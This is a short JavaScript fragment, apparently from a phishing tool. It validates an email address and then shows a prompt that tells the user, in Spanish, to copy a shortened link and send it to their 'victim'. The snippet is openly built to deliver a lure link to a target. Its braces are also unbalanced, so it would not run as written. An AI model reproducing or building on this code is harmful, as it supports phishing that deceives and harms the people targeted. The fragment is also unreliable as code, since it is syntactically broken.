    function pruebaemail(micorreo) {
      re = /^([\da-z_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$/
      if (!re.exec(micorreo)) {
        return false;
      } else {
        var mascota = prompt("Copia y envía este link a tu víctima", "https://cutt.ly/9cwXk6q");

        }
        return true;
      }
    }
